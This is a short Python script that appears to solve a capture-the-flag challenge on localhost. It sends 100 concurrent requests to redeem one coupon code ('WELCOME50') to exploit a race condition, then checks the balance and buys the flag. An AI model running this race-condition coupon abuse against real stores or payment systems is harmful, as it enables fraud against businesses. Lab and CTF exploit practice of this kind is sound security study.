import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://localhost:5000"

s = requests.Session()

# Establish the session and get our token cookie
s.get(URL)

def redeem(_):
    r = s.post(
        URL + "/api/redeem",
        json={"code": "WELCOME50"}
    )
    return r.status_code, r.json()

# Send a bunch simultaneously
with ThreadPoolExecutor(max_workers=100) as executor:
    results = list(executor.map(redeem, range(100)))

for result in results:
    print(result)

print("Balance:", s.get(URL + "/api/balance").json())

# Buy the flag
r = s.post(URL + "/api/buy_flag")
print(r.json())
